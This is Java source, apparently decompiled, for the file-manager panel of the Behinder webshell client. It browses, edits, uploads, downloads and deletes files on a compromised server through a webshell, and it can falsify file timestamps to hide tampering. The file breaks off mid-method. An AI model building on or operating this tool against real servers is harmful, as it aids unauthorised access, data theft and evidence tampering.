package net.rebeyond.behinder.ui.controller;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.UnsupportedEncodingException;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import javafx.application.Platform;
import javafx.beans.property.SimpleStringProperty;
import javafx.beans.property.StringProperty;
import javafx.beans.value.ChangeListener;
import javafx.beans.value.ObservableValue;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.fxml.FXML;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.Node;
import javafx.scene.control.Alert;
import javafx.scene.control.Button;
import javafx.scene.control.ButtonType;
import javafx.scene.control.ComboBox;
import javafx.scene.control.ContextMenu;
import javafx.scene.control.Label;
import javafx.scene.control.Menu;
import javafx.scene.control.MenuItem;
import javafx.scene.control.SeparatorMenuItem;
import javafx.scene.control.TableCell;
import javafx.scene.control.TableColumn;
import javafx.scene.control.TableRow;
import javafx.scene.control.TableView;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.control.TreeItem;
import javafx.scene.control.TreeView;
import javafx.scene.control.Alert.AlertType;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.input.KeyCode;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.scene.layout.StackPane;
import javafx.stage.FileChooser;
import javafx.stage.Window;
import net.rebeyond.behinder.core.Constants;
import net.rebeyond.behinder.core.ShellService;
import net.rebeyond.behinder.dao.ShellManager;
import net.rebeyond.behinder.utils.Utils;
import org.json.JSONArray;
import org.json.JSONObject;

public class FileManagerViewController {
   private ShellManager shellManager;
   @FXML
   private TreeView dirTree;
   @FXML
   private ComboBox currentPathCombo;
   @FXML
   private TableView fileListTableView;
   @FXML
   private TableColumn fileNameCol;
   @FXML
   private TableColumn filePermCol;
   @FXML
   private StackPane fileManagerStackPane;
   @FXML
   private GridPane fileListGridPane;
   @FXML
   private GridPane fileContentGridPane;
   @FXML
   private TextField filePathText;
   @FXML
   private Button openPathBtn;
   @FXML
   private ComboBox charsetCombo;
   @FXML
   private TextArea fileContentTextArea;
   @FXML
   private Button saveFileContentBtn;
   @FXML
   private Button cancelFileContentBtn;
   private ShellService currentShellService;
   private List workList;
   Map basicInfoMap;
   private Label statusLabel;
   private int listStage;

   public void init(ShellService shellService, List workList, Label statusLabel, Map basicInfoMap) {
      this.currentShellService = shellService;
      this.workList = workList;
      this.statusLabel = statusLabel;
      this.basicInfoMap = basicInfoMap;

      try {
         this.initFileManagerView();
      } catch (Exception var6) {
      }

   }

   private void initFileManagerView() throws Exception {
      this.initFileListTableColumns();
      this.initDirTree();
      this.initCurrentPathCombo();
      this.initCharsetCombo();
      this.loadContextMenu();
      this.cancelFileContentBtn.setOnAction((event) -> {
         this.switchPane("list");
      });
      this.saveFileContentBtn.setOnAction((event) -> {
         String filePath = this.filePathText.getText();

         try {
            this.saveFileContent(filePath);
         } catch (UnsupportedEncodingException var4) {
         }

      });
      this.openPathBtn.setOnAction((event) -> {
         this.expandByPath(this.currentPathCombo.getValue().toString());
      });
      this.switchPane("list");
   }

   private void initDirTree() throws Exception {
      String driveList = (String)this.basicInfoMap.get("driveList");
      TreeItem rootItem = new TreeItem("文件系统", new ImageView());
      rootItem.getGraphic().setUserData("base");
      Image icon = new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/drive.png")));
      String[] var4 = driveList.split(";");
      int var5 = var4.length;

      for(int var6 = 0; var6 < var5; ++var6) {
         String drive = var4[var6];
         TreeItem driveItem = new TreeItem(drive, new ImageView(icon));
         driveItem.getGraphic().setUserData("root");
         driveItem.setValue(drive);
         rootItem.getChildren().add(driveItem);
         this.dirTree.setRoot(rootItem);
      }

      this.dirTree.getSelectionModel().selectedItemProperty().addListener(new ChangeListener() {
         public void changed(ObservableValue observable, Object oldValue, Object newValue) {
            TreeItem currentTreeItem = (TreeItem)newValue;
            if (currentTreeItem != null) {
               String pathString = FileManagerViewController.this.getFullPath(currentTreeItem);
               FileManagerViewController.this.expandByPath(pathString);
            }

         }
      });
   }

   private void initCharsetCombo() {
      this.charsetCombo.setItems(FXCollections.observableArrayList(new String[]{"自动", "GBK", "UTF-8"}));
      this.charsetCombo.getSelectionModel().select(0);
      this.charsetCombo.getSelectionModel().selectedItemProperty().addListener((options, oldValue, newValue) -> {
         String filePath = this.filePathText.getText();
         String charset = newValue.toString().equals("自动") ? null : this.charsetCombo.getValue().toString();
         this.showFile(filePath, charset);
      });
   }

   private void initCurrentPathCombo() {
      this.currentPathCombo.getSelectionModel().selectedItemProperty().addListener((options, oldValue, newValue) -> {
         if (this.currentPathCombo.isFocused()) {
            this.expandByPath(newValue.toString());
         }

      });
      String currentPath = (String)this.basicInfoMap.get("currentPath");
      ObservableList pathList = FXCollections.observableArrayList(new String[]{currentPath});
      this.currentPathCombo.setItems(pathList);
      this.currentPathCombo.getSelectionModel().select(0);
   }

   private void uploadFile() throws Exception {
      String currentPath = this.currentPathCombo.getValue().toString();
      FileChooser fileChooser = new FileChooser();
      fileChooser.setTitle("请选择需要上传的文件");
      File selectdFile = fileChooser.showOpenDialog(this.fileListGridPane.getScene().getWindow());
      if (selectdFile != null) {
         String fileName = selectdFile.getName();
         byte[] fileContent = Utils.getFileData(selectdFile.getAbsolutePath());
         int bufSize = this.currentShellService.currentType.equals("aspx") ? 524288 : '됀';
         this.statusLabel.setText("正在上传……");
         Runnable runner = () -> {
            try {
               if (fileContent.length < bufSize) {
                  JSONObject resultObj = this.currentShellService.uploadFile(currentPath + fileName, fileContent);
                  String status = resultObj.getString("status");
                  String msg = resultObj.getString("msg");
                  if (status.equals("fail")) {
                     Platform.runLater(() -> {
                        this.statusLabel.setText("文件上传失败:" + msg);
                     });
                     return;
                  }
               } else {
                  List blocks = Utils.splitBytes(fileContent, bufSize);

                  for(int i = 0; i < blocks.size(); ++i) {
                     JSONObject resultObjx;
                     String statusx;
                     String msgx;
                     if (i == 0) {
                        resultObjx = this.currentShellService.uploadFile(currentPath + fileName, (byte[])blocks.get(i));
                        statusx = resultObjx.getString("status");
                        msgx = resultObjx.getString("msg");
                        if (statusx.equals("fail")) {
                           Platform.runLater(() -> {
                              this.statusLabel.setText("文件上传失败:" + msgx);
                           });
                           return;
                        }
                     } else {
                        resultObjx = this.currentShellService.appendFile(currentPath + fileName, (byte[])blocks.get(i));
                        statusx = resultObjx.getString("status");
                        msgx = resultObjx.getString("msg");
                        final int finali = i;
                        Platform.runLater(() -> {
                           if (statusx.equals("fail")) {
                              this.statusLabel.setText("文件上传失败:" + msgx);
                           } else {
                              this.statusLabel.setText(String.format("正在上传……%skb/%skb", bufSize * finali / 1024, fileContent.length / 1024));
                           }
                        });
                        if (statusx.equals("fail")) {
                           return;
                        }
                     }
                  }
               }

               Platform.runLater(() -> {
                  this.statusLabel.setText("上传完成");
                  this.expandByPath(currentPath);
               });
            } catch (Exception var11) {
               Platform.runLater(() -> {
                  this.statusLabel.setText("操作失败:" + var11.getMessage());
               });
            }

         };
         Thread workThrad = new Thread(runner);
         this.workList.add(workThrad);
         workThrad.start();
      }
   }

   private void rename(String oldFileName, String newFileName) {
      String currentDir = this.currentPathCombo.getValue().toString();
      String oldFullName = currentDir + oldFileName;
      String newFullName = currentDir + newFileName;
      Runnable runner = () -> {
         try {
            JSONObject resultObj = this.currentShellService.renameFile(oldFullName, newFullName);
            String status = resultObj.getString("status");
            String msg = resultObj.getString("msg");
            Platform.runLater(() -> {
               if (status.equals("fail")) {
                  this.statusLabel.setText(msg);
               } else {
                  this.statusLabel.setText(msg);
                  this.expandByPath(this.currentPathCombo.getValue().toString());
               }
            });
         } catch (Exception var6) {
            this.statusLabel.setText("操作失败:" + var6.getMessage());
         }

      };
      Thread workThrad = new Thread(runner);
      this.workList.add(workThrad);
      workThrad.start();
   }

   private void saveFileContent(String pathString) throws UnsupportedEncodingException {
      String charset = null;
      if (this.charsetCombo.getSelectionModel().getSelectedIndex() > 0) {
         charset = this.charsetCombo.getValue().toString();
      }

      String fileContentText = this.fileContentTextArea.getText();
      byte[] fileContent = charset == null ? fileContentText.getBytes() : fileContentText.getBytes(charset);
      this.statusLabel.setText("正在保存……");
      Runnable runner = () -> {
         try {
            JSONObject resultObj = this.currentShellService.uploadFile(pathString, fileContent, false);
            String status = resultObj.getString("status");
            String msg = resultObj.getString("msg");
            Platform.runLater(() -> {
               if (status.equals("success")) {
                  this.switchPane("list");
                  this.expandByPathSilent(this.currentPathCombo.getValue().toString());
                  this.statusLabel.setText("保存成功。");
               } else {
                  this.statusLabel.setText("保存失败:" + msg);
               }

            });
         } catch (Exception var6) {
            Platform.runLater(() -> {
               this.statusLabel.setText("操作失败:" + var6.getMessage());
            });
         }

      };
      Thread workThrad = new Thread(runner);
      this.workList.add(workThrad);
      workThrad.start();
   }

   private void switchPane(String show) {
      if (show.equals("list")) {
         this.fileListGridPane.setOpacity(1.0D);
         this.fileContentGridPane.setOpacity(0.0D);
         this.fileListGridPane.toFront();
      } else if (show.equals("content")) {
         this.fileListGridPane.toBack();
         this.fileListGridPane.setOpacity(0.0D);
         this.fileContentGridPane.setOpacity(1.0D);
         this.fileContentGridPane.toFront();
      }

   }

   private String getFullPath(TreeItem currentTreeItem) {
      String fileSep = "/";
      String currentPath = currentTreeItem.getValue().toString();
      TreeItem parent = currentTreeItem;

      while(!(parent = parent.getParent()).getGraphic().getUserData().equals("base")) {
         String parentText = parent.getValue().toString();
         if (parent.getGraphic().getUserData().equals("root")) {
            currentPath = parentText + currentPath;
         } else {
            currentPath = parentText + fileSep + currentPath;
         }
      }

      if (!parent.getGraphic().getUserData().equals("directory") && !currentPath.endsWith(fileSep)) {
         currentPath = currentPath + fileSep;
      }

      return currentPath;
   }

   private void initFileListTableColumns() {
      ObservableList tcs = this.fileListTableView.getColumns();
      ((TableColumn)tcs.get(0)).setCellValueFactory((data) -> {
         //return (StringProperty)((List)data.getValue()).get(0);
         return (StringProperty)((List)((TableColumn.CellDataFeatures)data).getValue()).get(0);
      });
      ((TableColumn)tcs.get(1)).setCellValueFactory((data) -> {
         //return (StringProperty)((List)data.getValue()).get(1);
         return (StringProperty)((List)((TableColumn.CellDataFeatures)data).getValue()).get(1);
      });
      ((TableColumn)tcs.get(1)).setComparator((o1, o2) -> {
         //return Long.compare(Long.parseLong(o1), Long.parseLong(o2));
         return Long.compare(Long.parseLong(o1.toString()), Long.parseLong(o2.toString()));
      });
      ((TableColumn)tcs.get(2)).setCellValueFactory((data) -> {
         //return (StringProperty)((List)data.getValue()).get(2);
         return (StringProperty)((List)((TableColumn.CellDataFeatures)data).getValue()).get(2);
      });
      ((TableColumn)tcs.get(3)).setCellValueFactory((data) -> {
         //return (StringProperty)((List)data.getValue()).get(4);
         return (StringProperty)((List)((TableColumn.CellDataFeatures)data).getValue()).get(4);
      });
      this.fileListTableView.setRowFactory((tv) -> {
         TableRow row = new TableRow();
         row.setOnMouseClicked((event) -> {
            if (event.getClickCount() == 2 && !row.isEmpty()) {
               event.consume();
               String path = this.currentPathCombo.getValue().toString();
               String name = ((StringProperty)((List)row.getItem()).get(0)).getValue().toString();
               String type = ((StringProperty)((List)row.getItem()).get(3)).getValue().toString();
               if (!path.endsWith("/")) {
                  path = path + "/";
               }

               if (type.equals("file")) {
                  String fileName = path + name;
                  this.filePathText.setText(fileName);
                  this.switchPane("content");
                  this.fileContentTextArea.clear();
                  this.showFile(fileName, (String)null);
               } else if (type.equals("directory")) {
                  this.expandByPath(path + name);
               }
            }

         });
         return row;
      });
      this.fileNameCol.setCellFactory((column) -> {
         return new TableCell<Object,String>() {
            public void updateItem(String item, boolean empty) {
               super.updateItem(item, empty);
               if (item == null | empty) {
                  this.setGraphic((Node)null);
                  this.setText((String)null);
               } else {
                  String type = null;

                  try {
                     type = (String)((StringProperty)((List)this.getTableRow().getItem()).get(3)).get();
                  } catch (Exception var11) {
                     return;
                  }

                  if (type.equals("directory")) {
                     try {
                        Image iconx = new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/folder.png")));
                        this.setGraphic(new ImageView(iconx));
                     } catch (Exception var10) {
                     }
                  } else if (type.equals("file")) {
                     try {
                        String name = (String)((StringProperty)((List)this.getTableRow().getItem()).get(0)).get();
                        String fileType = Utils.getFileType(name);
                        Image icon = new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/filetype/" + fileType + ".png")));
                        ImageView iconViewx = new ImageView(icon);
                        iconViewx.setFitHeight(16.0D);
                        iconViewx.setFitWidth(16.0D);
                        this.setGraphic(iconViewx);
                     } catch (Exception var9) {
                        try {
                           Image iconxx = new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/filetype/.png")));
                           ImageView iconView = new ImageView(iconxx);
                           iconView.setFitHeight(16.0D);
                           iconView.setFitWidth(16.0D);
                           this.setGraphic(iconView);
                        } catch (Exception var8) {
                        }
                     }
                  }

                  this.setText(item);
               }

            }
         };
      });
      this.filePermCol.setCellFactory((column) -> {
         return new TableCell<Object,String>() {
            public void updateItem(String item, boolean empty) {
               super.updateItem(item, empty);
               this.setText(item);
               this.setAlignment(Pos.CENTER);
            }
         };
      });
   }

   private TreeItem findTreeItemByPath(Path path) {
      String osInfo = (String)this.basicInfoMap.get("osInfo");
      TreeItem currentItem = null;
      List pathParts = new ArrayList();
      String pathString = path.toString().replace("\\", "/");
      if (pathString.equals("/")) {
         pathParts.add("/");
      } else {
         pathParts.addAll(Arrays.asList(pathString.split("/|\\\\")));
         if (osInfo.indexOf("linux") >= 0) {
            pathParts.set(0, "/");
         } else {
            pathParts.set(0, (String)pathParts.get(0) + "/");
         }
      }

      Image icon = null;

      try {
         icon = new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/folder.png")));
      } catch (Exception var10) {
      }

      for(Iterator var7 = pathParts.iterator(); var7.hasNext(); currentItem.setExpanded(true)) {
         String childPath = (String)var7.next();
         TreeItem childItem;
         if (currentItem == null) {
            childItem = this.findTreeItem(this.dirTree.getRoot(), childPath);
            currentItem = childItem;
         } else {
            childItem = this.findTreeItem(currentItem, childPath);
            if (childItem == null) {
               childItem = new TreeItem(childPath, new ImageView(icon));
               childItem.getGraphic().setUserData("directory");
               currentItem.getChildren().add(childItem);
            }

            currentItem = childItem;
         }
      }

      this.dirTree.getSelectionModel().select(currentItem);
      return currentItem;
   }

   private void insertTreeItems(JSONArray rows, TreeItem currentTreeItem) {
      currentTreeItem.getChildren().clear();

      for(int i = 0; i < rows.length(); ++i) {
         try {
            JSONObject fileObj = rows.getJSONObject(i);
            String type = new String(Base64.getDecoder().decode(fileObj.getString("type")), "UTF-8");
            String name = new String(Base64.getDecoder().decode(fileObj.getString("name")), "UTF-8");
            if (!name.equals(".") && !name.equals("..") && type.equals("directory")) {
               Image icon = new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/folder.png")));
               TreeItem treeItem = new TreeItem(name, new ImageView(icon));
               treeItem.getGraphic().setUserData("directory");
               currentTreeItem.getChildren().add(treeItem);
            }
         } catch (Exception var9) {
         }
      }

      currentTreeItem.setExpanded(true);
      this.dirTree.getSelectionModel().select(currentTreeItem);
   }

   private TreeItem findTreeItem(TreeItem treeItem, String text) {
      ObservableList childItemList = treeItem.getChildren();
      Iterator var4 = childItemList.iterator();

      Object childItem;
      do {
         if (!var4.hasNext()) {
            return null;
         }

         childItem = var4.next();
      } while(!((TreeItem)childItem).getValue().toString().equals(text));

      return (TreeItem)childItem;
   }

   private void insertFileRows(JSONArray jsonArray) {
      this.fileListTableView.getItems().clear();
      ObservableList data = FXCollections.observableArrayList();

      for(int i = 0; i < jsonArray.length(); ++i) {
         JSONObject rowObj = jsonArray.getJSONObject(i);

         try {
            String type = new String(Base64.getDecoder().decode(rowObj.getString("type")), "UTF-8");
            String name = new String(Base64.getDecoder().decode(rowObj.getString("name")), "UTF-8");
            String size = new String(Base64.getDecoder().decode(rowObj.getString("size")), "UTF-8");
            String perm = "";
            if (rowObj.has("perm")) {
               perm = new String(Base64.getDecoder().decode(rowObj.getString("perm")), "UTF-8");
            }

            String lastModified = new String(Base64.getDecoder().decode(rowObj.getString("lastModified")));
            List row = new ArrayList();
            row.add(0, new SimpleStringProperty(name));
            row.add(1, new SimpleStringProperty(size));
            row.add(2, new SimpleStringProperty(lastModified));
            row.add(3, new SimpleStringProperty(type));
            row.add(4, new SimpleStringProperty(perm));
            data.add(row);
         } catch (Exception var11) {
            var11.printStackTrace();
         }
      }

      this.fileListTableView.setItems(data);
   }

   private void expandByPath(String pathStr) {
      this.expandByPathInner(pathStr, false);
   }

   private void expandByPathSilent(String pathStr) {
      this.expandByPathInner(pathStr, true);
   }

   private void expandByPathInner(String pathStr, boolean silent) {
      Path path = Paths.get(pathStr).normalize();
      pathStr = path.toString().replace("\\", "/");
      String pathString = pathStr.endsWith("/") ? pathStr : pathStr + "/";
      TreeItem currentTreeItem = this.findTreeItemByPath(path);
      if (!silent) {
         this.statusLabel.setText("正在加载目录……");
      }

      this.listStage = Constants.LIST_STAGE_STARTED;
      Runnable runner = () -> {
         try {
            JSONObject resultObj = this.currentShellService.listFiles(pathString);
            Platform.runLater(() -> {
               try {
                  String status = resultObj.getString("status");
                  String msg = resultObj.getString("msg");
                  if (status.equals("fail")) {
                     this.listStage = Constants.LIST_STAGE_FAIL;
                     this.statusLabel.setText("目录读取失败:" + msg.trim());
                     return;
                  }

                  this.listStage = Constants.LIST_STAGE_DONE;
                  if (!silent) {
                     this.statusLabel.setText("目录加载成功");
                  }

                  if (!this.currentPathCombo.isFocused()) {
                     this.currentPathCombo.setValue(pathString);
                  }

                  msg = msg.replace("},]", "}]");
                  JSONArray objArr = new JSONArray(msg.trim());
                  this.insertFileRows(objArr);
                  this.insertTreeItems(objArr, currentTreeItem);
               } catch (Exception var8) {
                  this.listStage = Constants.LIST_STAGE_FAIL;
                  this.statusLabel.setText("操作失败：" + var8.getMessage());
               }

               this.switchPane("list");
            });
         } catch (Exception var5) {
            var5.printStackTrace();
         }

      };
      Thread workThrad = new Thread(runner);
      this.workList.add(workThrad);
      workThrad.start();
   }

   private void showFile(String filePath, String charset) {
      this.statusLabel.setText("正在加载文件内容……");
      this.switchPane("content");
      this.fileContentTextArea.clear();
      Runnable runner = () -> {
         try {
            JSONObject resultObj = this.currentShellService.showFile(filePath, charset);
            String status = resultObj.getString("status");
            String msg = resultObj.getString("msg");
            Platform.runLater(() -> {
               if (status.equals("fail")) {
                  this.statusLabel.setText("文件打开失败:" + msg);
               } else {
                  this.fileContentTextArea.setText(msg);
                  this.statusLabel.setText("文件内容加载成功。");
               }
            });
         } catch (Exception var6) {
            this.statusLabel.setText("操作失败:" + var6.getMessage());
            var6.printStackTrace();
         }

      };
      Thread workThrad = new Thread(runner);
      this.workList.add(workThrad);
      workThrad.start();
   }

   private void loadContextMenu() {
      ContextMenu cm = new ContextMenu();
      MenuItem refreshBtn = new MenuItem("刷新");
      cm.getItems().add(refreshBtn);
      MenuItem openBtn = new MenuItem("打开");
      cm.getItems().add(openBtn);
      MenuItem renameBtn = new MenuItem("重命名");
      cm.getItems().add(renameBtn);
      MenuItem delBtn = new MenuItem("删除");
      cm.getItems().add(delBtn);
      cm.getItems().add(new SeparatorMenuItem());
      MenuItem downloadBtn = new MenuItem("下载");
      cm.getItems().add(downloadBtn);
      MenuItem uploadBtn = new MenuItem("上传");
      cm.getItems().add(uploadBtn);
      Menu createMenu = new Menu("新建");
      MenuItem createFileBtn = new MenuItem("文件...");
      createFileBtn.setOnAction((event) -> {
         this.filePathText.setText(this.currentPathCombo.getValue() + "new.txt");
         this.fileContentTextArea.clear();
         this.switchPane("content");
      });
      MenuItem createDirectoryBtn = new MenuItem("文件夹");
      createDirectoryBtn.setOnAction((event) -> {
         this.createDirectory();
      });
      createMenu.getItems().add(createFileBtn);
      createMenu.getItems().add(createDirectoryBtn);
      cm.getItems().add(createMenu);
      cm.getItems().add(new SeparatorMenuItem());
      MenuItem changeTimeStampBtn = new MenuItem("修改时间戳");
      cm.getItems().add(changeTimeStampBtn);
      changeTimeStampBtn.setOnAction((event) -> {
         this.showChangeTimeStamp();
      });
      MenuItem cloneTimeStampBtn = new MenuItem("克隆时间戳");
      cm.getItems().add(cloneTimeStampBtn);
      this.fileListTableView.setContextMenu(cm);
      openBtn.setOnAction((event) -> {
         String type = ((StringProperty)((List)this.fileListTableView.getSelectionModel().getSelectedItem()).get(3)).getValue();
         String name = ((StringProperty)((List)this.fileListTableView.getSelectionModel().getSelectedItem()).get(0)).getValue();
         String pathString = this.currentPathCombo.getValue().toString();
         pathString = Paths.get(pathString).normalize().toString();
         if (!pathString.endsWith("/")) {
            pathString = pathString + "/";
         }

         pathString = pathString + name;
         if (type.equals("directory")) {
            this.expandByPath(pathString);
         } else {
            this.filePathText.setText(pathString);
            this.showFile(pathString, (String)null);
         }

      });
      refreshBtn.setOnAction((event) -> {
         this.statusLabel.setText("正在刷新……");
         this.expandByPath(this.currentPathCombo.getValue().toString());
         this.statusLabel.setText("刷新完成。");
      });
      renameBtn.setOnAction((event) -> {
         int row = this.fileListTableView.getSelectionModel().getSelectedIndex();
         String oldFileName = ((StringProperty)((List)this.fileListTableView.getSelectionModel().getSelectedItem()).get(0)).getValue();
         Alert confirmDialog = new Alert(AlertType.NONE);
         confirmDialog.setResizable(true);
         confirmDialog.setHeaderText("");
         confirmDialog.setTitle("重命名");
         Window window = confirmDialog.getDialogPane().getScene().getWindow();
         window.setOnCloseRequest((e) -> {
            window.hide();
         });
         HBox panel = new HBox();
         Label renameLabel = new Label("重命名：");
         renameLabel.setAlignment(Pos.BASELINE_CENTER);
         TextField renameTxt = new TextField(oldFileName);
         renameTxt.setPrefWidth(300.0D);
         panel.getChildren().addAll(new Node[]{renameLabel, renameTxt});
         confirmDialog.getDialogPane().setContent(panel);
         renameTxt.selectAll();
         renameTxt.setOnKeyPressed((keyEvent) -> {
            if (keyEvent.getCode() == KeyCode.ENTER) {
               String newFileName = renameTxt.getText();
               this.rename(oldFileName, newFileName);
               confirmDialog.getDialogPane().getScene().getWindow().hide();
            }

         });
         confirmDialog.showAndWait();
      });
      delBtn.setOnAction((event) -> {
         String name = ((StringProperty)((List)this.fileListTableView.getSelectionModel().getSelectedItem()).get(0)).getValue();
         String fileFullPath = this.currentPathCombo.getValue().toString() + name;
         Alert confirmDialog = new Alert(AlertType.CONFIRMATION);
         confirmDialog.setResizable(true);
         confirmDialog.setHeaderText("");
         confirmDialog.setTitle("删除文件");
         confirmDialog.setContentText("确认删除\"" + fileFullPath + "\" ?");
         Window window = confirmDialog.getDialogPane().getScene().getWindow();
         window.setOnCloseRequest((e) -> {
            window.hide();
         });
         Optional result = confirmDialog.showAndWait();
         if (result.get() == ButtonType.OK) {
            Runnable runner = () -> {
               try {
                  JSONObject resultObj = this.currentShellService.deleteFile(fileFullPath);
                  String status = resultObj.getString("status");
                  String msg = resultObj.getString("msg");
                  Platform.runLater(() -> {
                     if (status.equals("success")) {
                        this.expandByPath(this.currentPathCombo.getValue().toString());
                     }

                     this.statusLabel.setText(msg);
                  });
               } catch (Exception var5) {
                  Platform.runLater(() -> {
                     this.statusLabel.setText("操作失败:" + var5.getMessage());
                  });
               }

            };
            Thread workThrad = new Thread(runner);
            this.workList.add(workThrad);
            workThrad.start();
         }

      });
      uploadBtn.setOnAction((event) -> {
         try {
            this.uploadFile();
         } catch (Exception var3) {
            var3.printStackTrace();
         }

      });
      downloadBtn.setOnAction((event) -> {
         this.downloadFile();
      });
   }

   private void createDirectory() {
      Alert inputDialog = new Alert(AlertType.NONE);
      inputDialog.setResizable(true);
      inputDialog.setHeaderText("");
      inputDialog.setTitle("新建目录");
      Window window = inputDialog.getDialogPane().getScene().getWindow();
      window.setOnCloseRequest((e) -> {
         window.hide();
      });
      HBox hBox = new HBox();
      Label newDirectoryLabel = new Label("新建目录名称：");
      TextField newDirectoryTxt = new TextField("新建文件夹");
      newDirectoryTxt.setPrefWidth(300.0D);
      newDirectoryTxt.setOnKeyPressed((keyEvent) -> {
         if (keyEvent.getCode() == KeyCode.ENTER) {
            inputDialog.getDialogPane().getScene().getWindow().hide();
            String directoryName = newDirectoryTxt.getText();
            this.doCreateDirectory(directoryName);
         }

      });
      hBox.getChildren().addAll(new Node[]{newDirectoryLabel, newDirectoryTxt});
      inputDialog.getDialogPane().setContent(hBox);
      newDirectoryTxt.requestFocus();
      newDirectoryTxt.selectAll();
      inputDialog.showAndWait();
   }

   private void doCreateDirectory(String directoryName) {
      String currentPath = this.currentPathCombo.getValue().toString();
      String directoryPath = currentPath + directoryName;
      Runnable runner = () -> {
         try {
            JSONObject resultObj = this.currentShellService.createDirectory(directoryPath);
            String status = resultObj.getString("status");
            String msg = resultObj.getString("msg");
            Platform.runLater(() -> {
               if (status.equals("fail")) {
                  this.statusLabel.setText(msg);
               } else {
                  this.statusLabel.setText(msg);
                  this.expandByPath(this.currentPathCombo.getValue().toString());
               }
            });
         } catch (Exception var5) {
            Platform.runLater(() -> {
               this.statusLabel.setText("操作失败:" + var5.getMessage());
            });
         }

      };
      Thread workThrad = new Thread(runner);
      this.workList.add(workThrad);
      workThrad.start();
   }

   private void doChangeTimeStamp(String filePath, String createTimeStamp, String modifyTimeStamp, String accessTimeStamp) {
      Runnable runner = () -> {
         try {
            JSONObject resultObj = this.currentShellService.updateTimeStamp(filePath, createTimeStamp, accessTimeStamp, modifyTimeStamp);
            String status = resultObj.getString("status");
            String msg = resultObj.getString("msg");
            Platform.runLater(() -> {
               if (status.equals("fail")) {
                  this.statusLabel.setText(msg);
               } else {
                  this.statusLabel.setText(msg);
                  this.expandByPath(this.currentPathCombo.getValue().toString());
               }
            });
         } catch (Exception var8) {
            var8.printStackTrace();
            Platform.runLater(() -> {
               this.statusLabel.setText("操作失败:" + var8.getMessage());
            });
         }

      };
      Thread workThrad = new Thread(runner);
      this.workList.add(workThrad);
      workThrad.start();
   }

   private void showChangeTimeStamp() {
      Alert inputDialog = new Alert(AlertType.NONE);
      inputDialog.setResizable(true);
      inputDialog.setHeaderText("");
      inputDialog.setTitle("修改时间戳");
      Window window = inputDialog.getDialogPane().getScene().getWindow();
      window.setOnCloseRequest((e) -> {
         window.hide();
      });
      String currentPath = this.currentPathCombo.getValue().toString();
      String name = ((StringProperty)((List)this.fileListTableView.getSelectionModel().getSelectedItem()).get(0)).getValue();
      String filePath = currentPath + name;
      GridPane panel = new GridPane();
      panel.setPadding(new Insets(20.0D, 10.0D, 0.0D, 10.0D));
      panel.setHgap(20.0D);
      panel.setVgap(10.0D);
      Label fileNameLabel = new Label("文件：");
      fileNameLabel.setAlignment(Pos.CENTER_RIGHT);
      Label fileNameTxtLabel = new Label(name);
      Label createTimeLabel = new Label("创建时间：");
      TextField createTimeTxt = new TextField();
      Label accessTimeLabel = new Label("访问时间：");
      TextField accessTimeTxt = new TextField();
      Label modifyTimeLabel = new Label("修改时间：");
      TextField modifyTimeTxt = new TextField();
      HBox buttonBox = new HBox();
      Button saveBtn = new Button("保存");
      saveBtn.setOnAction((event) -> {
         this.doChangeTimeStamp(filePath, createTimeTxt.getText(), accessTimeTxt.getText(), modifyTimeTxt.getText());
         inputDialog.getDialogPane().getScene().getWindow().hide();
      });
      Button cancelBtn = new Button("取消");
      cancelBtn.setOnAction((event) -> {
         inputDialog.getDialogPane().getScene().getWindow().hide();
      });
      buttonBox.setSpacing(20.0D);
      buttonBox.setAlignment(Pos.CENTER);
      buttonBox.getChildren().addAll(new Node[]{saveBtn, cancelBtn});
      panel.add(fileNameLabel, 0, 0);
      panel.add(fileNameTxtLabel, 1, 0);
      panel.add(createTimeLabel, 0, 1);
      panel.add(createTimeTxt, 1, 1);
      panel.add(modifyTimeLabel, 0, 2);
      panel.add(modifyTimeTxt, 1, 2);
      panel.add(accessTimeLabel, 0, 3);
      panel.add(accessTimeTxt, 1, 3);
      panel.add(buttonBox, 0, 4, 2, 1);
      inputDialog.getDialogPane().setContent(panel);
      inputDialog.show();
      Runnable runner = () -> {
         try {
            JSONObject resultObj = this.currentShellService.getTimeStamp(filePath);
            String status = resultObj.getString("status");
            String msg = resultObj.getString("msg");
            Platform.runLater(() -> {
               if (status.equals("fail")) {
                  this.statusLabel.setText(msg);
               } else {
                  JSONObject timeStampObj = new JSONObject(msg);
                  String createTimeStamp = new String(Base64.getDecoder().decode(timeStampObj.getString("createTime")));
                  String accessTimeStamp = new String(Base64.getDecoder().decode(timeStampObj.getString("lastAccessTime")));
                  String modifyTimeStamp = new String(Base64.getDecoder().decode(timeStampObj.getString("lastModifiedTime")));
                  createTimeTxt.setText(createTimeStamp);
                  accessTimeTxt.setText(accessTimeStamp);
                  modifyTimeTxt.setText(modifyTimeStamp);
               }
            });
         } catch (Exception var8) {
            Platform.runLater(() -> {
               this.statusLabel.setText("操作失败:" + var8.getMessage());
            });
         }

      };
      Thread workThrad = new Thread(runner);
      this.workList.add(workThrad);
      workThrad.start();
   }

   private void downloadFile() {
      String fileName = ((StringProperty)((List)this.fileListTableView.getSelectionModel().getSelectedItem()).get(0)).getValue();
      String fileFullPath = this.currentPathCombo.getValue().toString() + fileName;
      FileChooser fileChooser = new FileChooser();
      fileChooser.setTitle("请选择保存路径");
      fileChooser.setInitialFileName(fileName);
      File selectedFile = fileChooser.showSaveDialog(this.fileListGridPane.getScene().getWindow());
      if (selectedFile != null) {
         String localFilePath = selectedFile.getAbsolutePath();
         this.statusLabel.setText("正在下载" + fileFullPath + "……");
         Runnable runner = () -> {
            try {
